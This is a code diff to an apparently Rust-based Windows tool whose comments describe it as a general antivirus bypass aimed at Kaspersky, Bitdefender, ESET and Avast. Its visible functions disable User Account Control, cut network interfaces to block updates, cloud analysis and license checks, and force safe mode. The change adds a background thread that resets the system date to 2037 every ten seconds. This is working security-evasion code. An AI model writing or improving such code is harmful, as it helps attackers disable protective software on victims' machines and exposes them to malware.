@@ -6,6 +6,7 @@ use winreg::enums::{HKEY_LOCAL_MACHINE, KEY_SET_VALUE, KEY_WRITE};
 use winreg::RegKey;
 use std::fs;
 use std::env;
+use std::thread;
 
 fn disable_uac() -> io::Result<()> {
     // Open the registry key for User Account Control
@@ -102,14 +103,14 @@ fn disable_network_interfaces() -> Result<(), std::io::Error> {
 }
 
 fn change_system_date() -> Result<(), String> {
-    // Change system date to 12-19-2037 (Windows format mm-dd-yyyy)
+    // Change system date to 12-12-2037 (Windows format mm-dd-yyyy)
     let date_command = "date 12-12-2037";
 
-    // Run date command
+    // Run the date command using cmd
     let date_output = Command::new("cmd")
         .arg("/C")
         .arg(date_command)
-        .stderr(Stdio::inherit())  // Pass error output to console
+        .stderr(Stdio::inherit())  // Direct error output to the console
         .output();
 
     match date_output {
@@ -124,9 +125,7 @@ fn change_system_date() -> Result<(), String> {
                 ))
             }
         }
-        Err(e) => {
-            Err(format!("Failed to execute date command: {}", e))
-        }
+        Err(e) => Err(format!("Failed to execute date command: {}", e)),
     }
 }
 
@@ -348,15 +347,21 @@ fn main() {
     }
 
     // Step 3: Kaspersky, Bitdefender, ESET, Avast etc. bypass (General Antivirus bypass)
-    // Cut network first to avoid auto update
+    // Cut network first to avoid auto update, cloud analysis, license check
     if let Err(e) = disable_network_interfaces() {
         eprintln!("Error disabling network interfaces: {}", e);
     }
 
-    // Then update system date
-    if let Err(e) = change_system_date() {
-        eprintln!("Error changing system date: {}", e);
-    }
+    // Spawn a new thread that repeatedly attempts to change the system date.
+    thread::spawn(|| {
+        loop {
+            if let Err(e) = change_system_date() {
+                eprintln!("Error changing system date: {}", e);
+            }
+            // Wait for 10 seconds before trying again.
+            thread::sleep(Duration::from_secs(10));
+        }
+    });
 
     // Step 4: Enable safe mode
     if let Err(e) = enable_safe_mode() {
